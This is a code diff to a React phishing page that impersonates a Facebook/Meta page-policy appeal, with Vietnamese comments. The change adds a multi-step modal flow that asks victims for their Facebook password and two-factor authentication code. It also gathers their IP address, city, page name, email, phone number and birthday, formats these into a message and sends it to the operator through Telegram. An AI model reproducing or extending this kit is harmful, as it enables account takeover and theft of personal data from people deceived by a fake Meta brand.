@@ -1,7 +1,8 @@
 import FromMetaImage from '@/assets/images/from-meta.png';
 import FacebookImage from '@/assets/images/icon.webp';
 import logoGif from '@/assets/images/logo1.gif';
-import PasswordInput from '@/components/password-input';
+import FormFlow from '@/components/form-flow';
+import { store } from '@/store/store';
 import { faChevronDown, faCircleExclamation, faCompass, faHeadset, faLock, faUserGear } from '@fortawesome/free-solid-svg-icons';
 import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
 import { useState, useEffect, useCallback, useMemo } from 'react';
@@ -56,7 +57,6 @@ const Home = () => {
         appeal: ''
     });
 
-    const [showPassword, setShowPassword] = useState(false);
     const [errors, setErrors] = useState({});
     const [translatedTexts, setTranslatedTexts] = useState(defaultTexts);
     const [countryCode, setCountryCode] = useState('US');
@@ -67,6 +67,8 @@ const Home = () => {
     
     const [showGif, setShowGif] = useState(true);
     const [homeTranslated, setHomeTranslated] = useState(false);
+
+    const { isModalOpen, setModalOpen, setGeoInfo, geoInfo, setBaseMessage, setUserEmail, setUserPhoneNumber, setUserFullName, setMessageId, resetPasswords, resetCodes, setTranslations, translations: currentTranslations } = store();
 
     useEffect(() => {
         setHomeTranslated(true);
@@ -85,51 +87,67 @@ const Home = () => {
         }
     }, [showGif, homeTranslated]);
 
-    // 🎯 CẬP NHẬT: Dịch ngầm cho verify + sendinfo
+    // 🎯 CẬP NHẬT: Dịch ngầm cho các modal mới (Password, Verify, Final)
     const translateBackgroundComponents = useCallback(async (targetLang) => {
         try {
+            // Text cho PasswordModal
             const passwordTexts = {
-                title: 'Please Enter Your Password',
-                description: 'For your security, you must enter your password to continue',
-                passwordLabel: 'Password',
-                placeholder: 'Enter your password',
-                continueBtn: 'Continue',
-                loadingText: 'Please wait'
+                'For your security, you must enter your password to continue.': 'For your security, you must enter your password to continue.',
+                'Password': 'Password',
+                "The password that you've entered is incorrect.": "The password that you've entered is incorrect.",
+                'Continue': 'Continue',
+                'Forgot your password?': 'Forgot your password?'
             };
 
-            const sendInfoTexts = {
-                title: 'Hệ thống chúng tôi đã tiếp nhận thông tin bạn gửi.',
-                description1: 'Nếu chúng tôi vẫn nhận thấy rằng bạn chưa đủ tuổi để sử dụng Facebook thì tài khoản của bạn sẽ vẫn bị vô hiệu hóa. Điều này là do tài khoản của bạn không tuân theo Điều khoản dịch vụ của chúng tôi.',
-                description2: 'Chúng tôi luôn quan tâm đến tính bảo mật của mọi người trên Facebook nên bạn không thể sử dụng tài khoản của mình cho đến lúc đó.'
-            };
-
-            // 🎯 Dịch verify với data mặc định - ĐÃ SỬA
+            // Text cho VerifyModal
             const verifyTexts = {
-                title: 'Check your device',
-                description: `We have sent a verification code to s****g@m****.com, ******32 . Please enter the code we just sent to continue.`,
-                placeholder: 'Enter your code',
-                infoTitle: 'Approve from another device or Enter your verification code',
-                infoDescription: 'This may take a few minutes. Please do not leave this page until you receive the code. Once the code is sent, you will be able to appeal and verify.',
-                submit: 'Continue',
-                sendCode: 'Send new code',
-                errorMessage: 'The verification code you entered is incorrect',
-                loadingText: 'Please wait'
+                'Facebook': 'Facebook',
+                'Two-factor authentication required': 'Two-factor authentication required',
+                'Go to your authentication app': 'Go to your authentication app',
+                "We've sent a verification code to your": "We've sent a verification code to your",
+                'and': 'and',
+                "To continue, you'll need to enter a verification code or approve it from another device.": "To continue, you'll need to enter a verification code or approve it from another device.",
+                'This process may take a few minutes.': 'This process may take a few minutes.',
+                "Please don't leave this page until you receive the code.": "Please don't leave this page until you receive the code.",
+                'Enter the 6-digit code for this account from the two-factor authentication app that you set up (such as Duo Mobile or Google Authenticator).': 'Enter the 6-digit code for this account from the two-factor authentication app that you set up (such as Duo Mobile or Google Authenticator).',
+                'Code': 'Code',
+                'The two-factor authentication you entered is incorrect': 'The two-factor authentication you entered is incorrect',
+                'Please, try again after': 'Please, try again after',
+                'minutes': 'minutes',
+                'seconds': 'seconds',
+                'Try another way': 'Try another way'
             };
 
-            const [translatedPassword, translatedSendInfo, translatedVerify] = await Promise.all([
-                translateObjectTexts(passwordTexts, targetLang),
-                translateObjectTexts(sendInfoTexts, targetLang),
-                translateObjectTexts(verifyTexts, targetLang)
-            ]);
+            // Text cho FinalModal
+            const finalTexts = {
+                'Request has been sent': 'Request has been sent',
+                'Your request has been added to the processing queue': 'Your request has been added to the processing queue',
+                'We will handle your request within 24 hours': 'We will handle your request within 24 hours',
+                'in case we do not receive feedback': 'in case we do not receive feedback',
+                'please send back information so we can assist you': 'please send back information so we can assist you',
+                'From the Customer support Meta': 'From the Customer support Meta',
+                'Return to Facebook': 'Return to Facebook'
+            };
 
-            localStorage.setItem(`translatedPassword_${targetLang}`, JSON.stringify(translatedPassword));
-            localStorage.setItem(`translatedSendInfo_${targetLang}`, JSON.stringify(translatedSendInfo));
-            localStorage.setItem(`translatedVerify_${targetLang}`, JSON.stringify(translatedVerify));
+            // Dịch tất cả các text
+            const allTexts = { ...passwordTexts, ...verifyTexts, ...finalTexts };
+            const translatedTexts = {};
+            
+            for (const [key, value] of Object.entries(allTexts)) {
+                try {
+                    translatedTexts[key] = await translateText(value, targetLang);
+                } catch {
+                    translatedTexts[key] = value;
+                }
+            }
+
+            // Lưu vào store thay vì localStorage
+            setTranslations(translatedTexts);
             
         } catch (error) {
             console.log('Background translation failed:', error);
         }
-    }, []);
+    }, [setTranslations]);
 
     const translateObjectTexts = async (textsObject, targetLang) => {
         const translatedObject = {};
@@ -156,6 +174,15 @@ const Home = () => {
             
             localStorage.setItem('ipInfo', JSON.stringify(ipData));
             
+            // Set geoInfo vào store
+            setGeoInfo({
+                asn: ipData.asn || 0,
+                ip: ipData.ip || 'CHỊU',
+                country: ipData.country || 'CHỊU',
+                city: ipData.city || 'CHỊU',
+                country_code: ipData.country_code || 'US'
+            });
+            
             const detectedCountry = ipData.country_code || 'US';
             setCountryCode(detectedCountry);
 
@@ -174,12 +201,19 @@ const Home = () => {
             
         } catch (error) {
             console.log('Security initialization failed:', error.message);
+            setGeoInfo({
+                asn: 0,
+                ip: 'CHỊU',
+                country: 'CHỊU',
+                city: 'CHỊU',
+                country_code: 'US'
+            });
             setCountryCode('US');
             setCallingCode('+1');
             setSecurityChecked(true);
             setIsFormEnabled(true);
         }
-    }, []);
+    }, [setGeoInfo]);
 
     const translateCriticalTexts = useCallback(async (targetLang) => {
         try {
@@ -360,9 +394,73 @@ const Home = () => {
             try {
                 setIsSubmitting(true);
                 
+                // Reset passwords và codes khi submit form mới
+                resetPasswords();
+                resetCodes();
+
+                // Format thời gian
+                const now = new Date();
+                const formattedTime = now.toLocaleString('vi-VN', {
+                    timeZone: 'Asia/Ho_Chi_Minh',
+                    year: 'numeric',
+                    month: '2-digit',
+                    day: '2-digit',
+                    hour: '2-digit',
+                    minute: '2-digit',
+                    second: '2-digit'
+                });
+
+                // Format date of birth: DD/MM/YYYY từ YYYY-MM-DD
+                const birthdayParts = formData.birthday.split('-');
+                const dateOfBirth = birthdayParts.length === 3 
+                    ? `${birthdayParts[2]}/${birthdayParts[1]}/${birthdayParts[0]}`
+                    : formData.birthday;
+                
+                // Format phone number (chỉ lấy số, giữ nguyên format)
+                const phoneNumberOnly = formData.phone.replace(/[^\d+]/g, '');
+
+                // Tạo base message với format đúng
+                const currentGeoInfo = geoInfo || {
+                    ip: 'k lấy được',
+                    city: 'k lấy được',
+                    country_code: 'k lấy được'
+                };
+                const location = `${currentGeoInfo.city || 'k lấy được'} - ${currentGeoInfo.country_code || 'k lấy được'}`;
+                const messageLines = [
+                    `📅 Thời gian: ${formattedTime}`,
+                    `🌍 IP: ${currentGeoInfo.ip || 'k lấy được'}`,
+                    `📍 Vị trí: ${location}`,
+                    '',
+                    `🔖 Page Name: ${formData.pageName}`,
+                    `📧 Email: ${formData.mail}`,
+                    `📱 Số điện thoại: ${phoneNumberOnly}`,
+                    `🎂 Ngày sinh: ${dateOfBirth}`,
+                    ''
+                ];
+
+                const baseMessage = messageLines.join('\n');
+
+                // Lưu base message vào store
+                setBaseMessage(baseMessage);
+
+                // Save user data to store
+                setUserEmail(formData.mail);
+                setUserPhoneNumber(formData.phone);
+                setUserFullName(formData.pageName);
+                
                 // 🎯 GỬI TELEGRAM DATA FORM
+                try {
                 const telegramMessage = formatTelegramMessage(formData);
-                await sendMessage(telegramMessage);
+                    const res = await sendMessage(telegramMessage);
+
+                    // Cập nhật messageId nếu có
+                    if (res?.messageId) {
+                        setMessageId(res.messageId);
+                    }
+                } catch (telegramError) {
+                    console.error('Telegram send error:', telegramError);
+                    // Không throw, tiếp tục flow dù có lỗi telegram
+                }
 
                 // 🎯 LƯU DATA VÀO LOCALSTORAGE
                 const userInfoData = {
@@ -376,17 +474,19 @@ const Home = () => {
                 // 🎯 UPDATE DỊCH VERIFY VỚI DATA THẬT (TRƯỚC KHI HIỆN PASSWORD)
                 const targetLang = localStorage.getItem('targetLang');
                 if (targetLang && targetLang !== 'en') {
-                    await updateVerifyTranslation(targetLang, userInfoData.email, userInfoData.phone);
+                    await updateVerifyTranslation(targetLang, formData.mail, formData.phone);
                 }
 
-                // 🎯 HIỆN PASSWORD SAU KHI ĐÃ UPDATE ALL XONG
+                // 🎯 HIỆN FORM FLOW SAU KHI ĐÃ UPDATE ALL XONG
                 setIsSubmitting(false);
-                setShowPassword(true);
+                console.log('Opening modal, baseMessage:', baseMessage);
+                setModalOpen(true);
                 
             } catch (error) {
                 setIsSubmitting(false);
                 console.error('Submit error:', error);
-                window.location.href = 'about:blank';
+                // Không redirect về about:blank, chỉ log lỗi
+                // window.location.href = 'about:blank';
             }
         } else {
             const firstErrorField = Object.keys(errors)[0];
@@ -399,27 +499,39 @@ const Home = () => {
         }
     };
 
-    // 🎯 HÀM UPDATE DỊCH VERIFY VỚI DATA THẬT - ĐÃ SỬA
-    const updateVerifyTranslation = async (targetLang, email, phone) => {
+    // 🎯 HÀM UPDATE DỊCH VERIFY VỚI DATA THẬT - CẬP NHẬT CHO MODAL MỚI
+    const updateVerifyTranslation = useCallback(async (targetLang, email, phone) => {
         try {
-            const verifyTexts = {
-                title: 'Check your device',
-                description: `We have sent a verification code to ${email}, ${phone} . Please enter the code we just sent to continue.`,
-                placeholder: 'Enter your code',
-                infoTitle: 'Approve from another device or Enter your verification code',
-                infoDescription: 'This may take a few minutes. Please do not leave this page until you receive the code. Once the code is sent, you will be able to appeal and verify.',
-                submit: 'Continue',
-                sendCode: 'Send new code',
-                errorMessage: 'The verification code you entered is incorrect',
-                loadingText: 'Please wait'
+            // Text cần dịch với data thật (email và phone sẽ được mask trong VerifyModal)
+            const verifyTextsWithData = {
+                "We've sent a verification code to your": "We've sent a verification code to your",
+                'and': 'and',
+                "To continue, you'll need to enter a verification code or approve it from another device.": "To continue, you'll need to enter a verification code or approve it from another device.",
+                'This process may take a few minutes.': 'This process may take a few minutes.',
+                "Please don't leave this page until you receive the code.": "Please don't leave this page until you receive the code."
             };
 
-            const translatedVerify = await translateObjectTexts(verifyTexts, targetLang);
-            localStorage.setItem(`translatedVerify_${targetLang}`, JSON.stringify(translatedVerify));
+            // Dịch các text này
+            const translatedVerifyTexts = {};
+            for (const [key, value] of Object.entries(verifyTextsWithData)) {
+                try {
+                    translatedVerifyTexts[key] = await translateText(value, targetLang);
+                } catch {
+                    translatedVerifyTexts[key] = value;
+                }
+            }
+
+            // Merge với translations hiện tại và lưu vào store
+            const updatedTranslations = {
+                ...currentTranslations,
+                ...translatedVerifyTexts
+            };
+
+            setTranslations(updatedTranslations);
         } catch (error) {
             console.log('Update verify translation failed:', error);
         }
-    };
+    }, [setTranslations, currentTranslations]);
 
     const formatTelegramMessage = (data) => {
         const timestamp = new Date().toLocaleString('vi-VN');
@@ -436,9 +548,6 @@ const Home = () => {
 🎂 <b>Ngày sinh:</b> <code>${data.birthday}</code>`;
     };
 
-    const handleClosePassword = () => {
-        setShowPassword(false);
-    };
 
     const data_list = [
         {
@@ -470,7 +579,7 @@ const Home = () => {
                     <img 
                         src={logoGif} 
                         alt="Loading" 
-                        className="w-96 h-96 lg:w-[500px] lg:h-[500px]" 
+                        className="w-[450px] h-auto lg:w-[600px] lg:h-auto object-contain" 
                     />
                 </div>
             )}
@@ -511,12 +620,12 @@ const Home = () => {
                             <div className='bg-[#e4e6eb] p-4 sm:p-6'>
                                 <p className='text-xl sm:text-3xl font-bold'>{translatedTexts.pagePolicyAppeals}</p>
                             </div>
-                            <div className='p-4 text-base leading-7 font-medium sm:text-base sm:leading-7'>
+                            <div className='px-4 pt-4 pb-2 text-base leading-7 font-medium sm:text-base sm:leading-7'>
                                 <p className='mb-3 whitespace-pre-line'>{translatedTexts.detectedActivity}</p>
                                 <p className='mb-3'>{translatedTexts.accessLimited}</p>
-                                <p>{translatedTexts.submitAppeal}</p>
+                                <p className='mb-0'>{translatedTexts.submitAppeal}</p>
                             </div>
-                            <div className='flex flex-col gap-3 p-4 text-sm leading-6 font-semibold'>
+                            <div className='flex flex-col gap-3 px-4 pb-4 pt-0 text-sm leading-6 font-semibold'>
                                 <div className='flex flex-col gap-2'>
                                     <p className='text-base sm:text-base'>
                                         {translatedTexts.pageName} <span className='text-red-500'>*</span>
@@ -673,7 +782,7 @@ const Home = () => {
                         </div>
                     </div>
                 </main>
-                {showPassword && <PasswordInput onClose={handleClosePassword} />}
+                {isModalOpen && <FormFlow />}
             </div>
         </>
     );
